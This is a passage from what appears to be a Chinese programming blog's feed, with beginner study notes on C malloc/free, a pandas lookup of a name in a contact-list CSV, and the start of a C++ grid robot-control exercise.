        <content type="html"><![CDATA[<p>9.6 指针和动态存储管理<br>动态存储管理：<br>就是在程序运行过程中向计算机申请分配一段存储单元或把早先申请的内存给计算机。<br>malloc函数和free函数<br>★malloc函数申请分配内存空间<br>      ◆定义：void*malloc(unsinged size)<br>      ◆返回：NULL或一个指针。<br>      ◆说明：申请分配一个大小为size个字节的连续内存空间，如成功则返<br>            回分配空间段的起始地址，否则返回NULL。<br> ★free函数是malloc函数的逆过程，释放一段空间<br>     ◆定义：void free(ptr)<br>           void *ptr<br>     ◆返回：无<br>     ◆说明：把指针ptr所指向的一段内存单元释放。</p><ol start="3"><li>核心概念解释<br>你提到了不太懂 malloc 和 exit，我用通俗的比喻来解释：<br>A. malloc (Memory Allocation - 内存分配)<br>想象你在去住旅馆：<br> • 普通变量 (int a): 就像是你自己带了帐篷，编译器自动帮你找地方扎营，你不用操心。<br> • malloc: 就像你去前台（操作系统）说：“我要开一间房”。<br>语法拆解： p &#x3D; (int*)malloc(sizeof(int));<ol><li>sizeof(int): 告诉前台你要多大的房间（例如：一个整数那么大，通常 4 字节）。</li><li>malloc(…): 这是一个动作，去内存堆（Heap）里找一块空地。<br> ○ 如果找到了：返回这块地的地址（钥匙）。<br> ○ 如果没找到（内存满了）：返回 NULL（空）。</li><li>(int*): malloc 返回的是通用钥匙（void*），你需要把它转换成专门开“整数房间”的钥匙。</li><li>free(p): 退房。非常重要！ 用完 malloc 申请的内存必须手动释放，否则这块内存会一直被占用（内存泄漏），直到程序结束。<br>B. exit (程序退出)<br>想象你的程序正在按步骤执行任务：<br> • return 0: 任务圆满完成，正常下班。<br> • exit(1): 紧急制动按钮。<br>用法解释：<br> • 无论程序运行到哪一行代码（即使在深层嵌套的函数里），只要遇到 exit，程序立刻彻底终止。<br> • exit(1) (非零值): 告诉操作系统“我是因为出错了才退出的”。<br> • exit(0): 告诉操作系统“我正常退出了”。</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">main()&#123;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line"><span class="keyword">if</span>((p=(<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)))==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error on malloc!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">*p=<span class="number">580</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d,%o\n&quot;</span>,*p,p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">if</span>((p=(<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)))==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error on malloc!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">*p=<span class="number">1200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d,%o\n&quot;</span>,*p,p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求若干个输入数据中的最大值和最小值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">float</span> *p,*q,min,max;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the number of data:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">p=(<span class="type">float</span>*)<span class="built_in">malloc</span>(n *<span class="keyword">sizeof</span>(<span class="type">float</span>));</span><br><span class="line"><span class="keyword">for</span>(q=p;q&lt;p+n;q++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,q);</span><br><span class="line"><span class="keyword">for</span>(min=*p,max=*p,q=p+<span class="number">1</span>;q&lt;p+n;q++)</span><br><span class="line">&#123;</span><br><span class="line">min=(*q&lt;min?*q:min);</span><br><span class="line">max=(*q&gt;max?*q:max);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The max is %g\n&quot;</span>, max);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The min is %g\n&quot;</span>, min);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSV文件中查找内容</title>
      <link href="/2025/11/30/Python/%E5%A4%B4%E6%AD%8C%E5%AE%9E%E8%AE%AD/"/>
      <url>/2025/11/30/Python/%E5%A4%B4%E6%AD%8C%E5%AE%9E%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h2><p>我们需要写一个函数，实现：<br>输入一个姓名<br>在CSV文件中查找这个姓名<br>如果找到：显示这个人的所有信息<br>如果没找到：显示”查无此人”</p><h2 id="理解DataFrame数据结构"><a href="#理解DataFrame数据结构" class="headerlink" title="理解DataFrame数据结构"></a>理解DataFrame数据结构</h2><p>DataFrame就像Excel表格，有行和列</p><h2 id="两种实现方法"><a href="#两种实现方法" class="headerlink" title="两种实现方法"></a>两种实现方法</h2><h3 id="方法一：使用循环查找"><a href="#方法一：使用循环查找" class="headerlink" title="方法一：使用循环查找"></a>方法一：使用循环查找</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cztxb</span>():</span><br><span class="line">    <span class="comment"># 读取CSV文件</span></span><br><span class="line">    df = pd.read_csv(<span class="string">&#x27;wjgl/通信录.csv&#x27;</span>, names=[<span class="string">&quot;姓名&quot;</span>,<span class="string">&quot;住址&quot;</span>,<span class="string">&quot;电话&quot;</span>,<span class="string">&quot;生日&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取要查询的姓名</span></span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    </span><br><span class="line">    found = <span class="literal">False</span>  <span class="comment"># 标记是否找到</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历每一行数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df)):</span><br><span class="line">        <span class="comment"># 如果当前行的姓名等于要查询的姓名</span></span><br><span class="line">        <span class="keyword">if</span> df.iloc[i][<span class="string">&#x27;姓名&#x27;</span>] == name:</span><br><span class="line">            <span class="comment"># 显示找到的信息</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;姓名:&quot;</span>, df.iloc[i][<span class="string">&#x27;姓名&#x27;</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;住址:&quot;</span>, df.iloc[i][<span class="string">&#x27;住址&#x27;</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;电话:&quot;</span>, df.iloc[i][<span class="string">&#x27;电话&#x27;</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;生日:&quot;</span>, df.iloc[i][<span class="string">&#x27;生日&#x27;</span>])</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 找到后就退出循环</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果循环结束都没找到</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;查无此人&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="方法二：使用pandas筛选"><a href="#方法二：使用pandas筛选" class="headerlink" title="方法二：使用pandas筛选"></a>方法二：使用pandas筛选</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cztxb</span>():</span><br><span class="line">    <span class="comment"># 读取CSV文件</span></span><br><span class="line">    df = pd.read_csv(<span class="string">&#x27;wjgl/通信录.csv&#x27;</span>, names=[<span class="string">&quot;姓名&quot;</span>,<span class="string">&quot;住址&quot;</span>,<span class="string">&quot;电话&quot;</span>,<span class="string">&quot;生日&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取要查询的姓名</span></span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 筛选出姓名列等于输入姓名的所有行</span></span><br><span class="line">    result = df[df[<span class="string">&#x27;姓名&#x27;</span>] == name]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 判断筛选结果是否为空</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 显示找到的信息</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;查无此人&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="代码详细解释"><a href="#代码详细解释" class="headerlink" title="代码详细解释"></a>代码详细解释</h2><p>让我们用生活中的例子来理解：<br>方法二的解释：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 就像你用筛选功能在Excel中找人</span></span><br><span class="line">名单 = 整个表格  <span class="comment"># DataFrame</span></span><br><span class="line"></span><br><span class="line">要找的人 = <span class="built_in">input</span>()  <span class="comment"># 输入姓名</span></span><br><span class="line"></span><br><span class="line">筛选结果 = 名单[名单的姓名列 == 要找的人]  <span class="comment"># 点击筛选按钮</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 看看筛选结果有没有数据</span></span><br><span class="line"><span class="keyword">if</span> 筛选结果不为空:</span><br><span class="line">    <span class="built_in">print</span>(筛选结果)  <span class="comment"># 显示筛选出来的行</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;查无此人&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当前位置的sc文件夹下csv格式文件“通信簿”，</span></span><br><span class="line"><span class="comment">#该文件每行记录一个姓名、住址、电话号码和生日</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">df=pd.read_csv(<span class="string">&#x27;wjgl/src/通信录.csv&#x27;</span>,names=[<span class="string">&quot;姓名&quot;</span>,<span class="string">&quot;住址&quot;</span>,<span class="string">&quot;电话&quot;</span>,<span class="string">&quot;生日&quot;</span>])</span><br><span class="line">df.to_csv(<span class="string">&#x27;wjgl/通信录.csv&#x27;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>,index=<span class="number">0</span>,header=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xstxb</span>():</span><br><span class="line">    df=pd.read_csv(<span class="string">&#x27;wjgl/通信录.csv&#x27;</span>,names=[<span class="string">&quot;姓名&quot;</span>,<span class="string">&quot;住址&quot;</span>,<span class="string">&quot;电话&quot;</span>,<span class="string">&quot;生日&quot;</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(df)):</span><br><span class="line">        <span class="built_in">print</span>(df.iloc[i][:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cztxb</span>():</span><br><span class="line">    df=pd.read_csv(<span class="string">&#x27;wjgl/通信录.csv&#x27;</span>,names=[<span class="string">&quot;姓名&quot;</span>,<span class="string">&quot;住址&quot;</span>,<span class="string">&quot;电话&quot;</span>,<span class="string">&quot;生日&quot;</span>])</span><br><span class="line">    <span class="comment"># 获取用户输入的姓名</span></span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    <span class="comment"># 使用DataFrame的条件筛选来查找匹配的记录</span></span><br><span class="line">    result = df[df[<span class="string">&#x27;姓名&#x27;</span>] == name]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 判断查询结果</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 如果找到匹配的记录，显示信息</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果没有找到，显示&quot;查无此人&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;查无此人&quot;</span>)</span><br><span class="line"></span><br><span class="line">ch=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(ch!=<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">    ch=<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ch==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        zjtxb()</span><br><span class="line">    <span class="keyword">elif</span> ch==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        sctxb()</span><br><span class="line">    <span class="keyword">elif</span> ch==<span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        cztxb()</span><br><span class="line">    <span class="keyword">elif</span> ch==<span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        xgtxb()</span><br><span class="line">    <span class="keyword">elif</span> ch==<span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        xstxb()</span><br><span class="line">    <span class="keyword">elif</span> ch==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h2><p>1）df.iloc[i]：获取第i行的数据<br>2）df.iloc[i][‘姓名’]：获取第i行的”姓名”列的值<br>3）len(df)：获取DataFrame的行数<br>4）range(len(df))：生成从0到行数-1的数字序列</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKD运动操控</title>
      <link href="/2025/11/28/C++/C++%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%93%8D%E6%8E%A7/"/>
      <url>/2025/11/28/C++/C++%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%93%8D%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="week-1"><a href="#week-1" class="headerlink" title="week 1"></a>week 1</h2><p>编写一个简单的机器人控制系统</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> direction = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> enemyX[<span class="number">100</span>], enemyY[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> enemyCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> command;</span><br><span class="line"><span class="type">int</span> distance;</span><br><span class="line"><span class="type">int</span> xd = <span class="number">0</span>, yd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">cin &gt;&gt; command;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (command == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">cin &gt;&gt; distance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (direction == <span class="number">0</span>) &#123;</span><br><span class="line">y += distance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">90</span>) &#123;</span><br><span class="line">x += distance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">180</span>) &#123;</span><br><span class="line">y -= distance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">270</span>) &#123;</span><br><span class="line">x += distance;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">&#123; <span class="comment">// 后退</span></span><br><span class="line">cin &gt;&gt; distance;</span><br><span class="line"><span class="keyword">if</span> (direction == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">y -= distance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line">x -= distance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">180</span>)</span><br><span class="line">&#123;</span><br><span class="line">y += distance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">270</span>)</span><br><span class="line">&#123;</span><br><span class="line">x += distance;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">direction = (direction - <span class="number">90</span> + <span class="number">360</span>) % <span class="number">360</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">direction = (direction + <span class="number">90</span>) % <span class="number">360</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(command == <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">&#123;<span class="comment">//新增敌人</span></span><br><span class="line"><span class="type">int</span> enemyXPos, enemyYPos;</span><br><span class="line">cin &gt;&gt; enemyXPos &gt;&gt; enemyYPos;</span><br><span class="line">enemyX[enemyCount] = enemyXPos;</span><br><span class="line">enemyY[enemyCount] = enemyYPos;</span><br><span class="line">enemyCount++;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算最近的敌人</span></span><br><span class="line"><span class="type">int</span> minDist = <span class="number">1000000</span>;</span><br><span class="line"><span class="type">int</span> nearestEnemyIndex = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; enemyCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> dist = <span class="built_in">abs</span>(x - enemyX[i]) + <span class="built_in">abs</span>(y - enemyY[i]);</span><br><span class="line"><span class="keyword">if</span> (dist &lt; minDist)</span><br><span class="line">&#123;</span><br><span class="line">minDist = dist;</span><br><span class="line">nearestEnemyIndex = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出最近敌人</span></span><br><span class="line"><span class="type">int</span> targetX = enemyX[nearestEnemyIndex];</span><br><span class="line"><span class="type">int</span> targetY = enemyY[nearestEnemyIndex];</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;最近敌人位置: (&quot;</span> &lt;&lt; targetX &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; targetY &lt;&lt; <span class="string">&quot;), 所需控制操作: [&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出控制操作</span></span><br><span class="line"><span class="comment">//step是要往前走多少步能和敌人在同一行或列</span></span><br><span class="line"><span class="comment">//right是敌人在右边多少格</span></span><br><span class="line"><span class="type">int</span> step;</span><br><span class="line"><span class="type">int</span> right;</span><br><span class="line"><span class="keyword">if</span> (direction == <span class="number">0</span>) &#123;</span><br><span class="line">step = targetY - y;</span><br><span class="line">right = targetX - x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line">step = targetX - x;</span><br><span class="line">right = y - targetY;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">180</span>)</span><br><span class="line">&#123;</span><br><span class="line">step = y - targetY;</span><br><span class="line">right = x - targetX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">step = x - targetX;</span><br><span class="line">right = targetY - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (right != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (step &gt; <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;w &quot;</span> &lt;&lt; step &lt;&lt; <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (step &lt; <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;s &quot;</span> &lt;&lt; -step &lt;&lt; <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (right &gt; <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;d&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (right &lt; <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (step &lt; <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;d,d&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span 